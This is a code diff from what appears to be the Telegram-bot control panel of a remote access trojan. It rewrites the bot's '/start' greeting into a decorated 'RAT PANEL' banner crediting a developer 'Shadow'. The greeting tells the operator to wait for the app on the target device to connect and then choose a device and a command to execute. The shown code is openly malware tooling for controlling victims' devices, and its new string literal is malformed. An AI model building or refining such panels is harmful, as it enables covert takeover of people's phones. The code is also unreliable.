@@ -366,11 +366,24 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
-                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
-                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
-                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
-                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
+                '''╔═══✨ 𝙍𝘼𝙏 𝙋𝘼𝙉𝙀𝙇 ✨═══╗\n\n' +
+'👨‍💻 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧: 𝙎𝙝𝙖𝙙𝙤𝙬\n\n' +
+
+'⚡ 𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎:\n\n' +
+
+'➤ If the application is installed on the target device,\n' +
+'   wait for the connection.\n\n' +
+
+'➤ Once you receive the connection message,\n' +
+'   it means the device is connected and ready.\n\n' +
+
+'➤ Click on "Execute Command" and select your device,\n' +
+'   then choose the desired action.\n\n' +
+
+'➤ If you get stuck anywhere,\n' +
+'   simply send /start again.\n\n' +
+
+'╚══════════════════════╝'
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
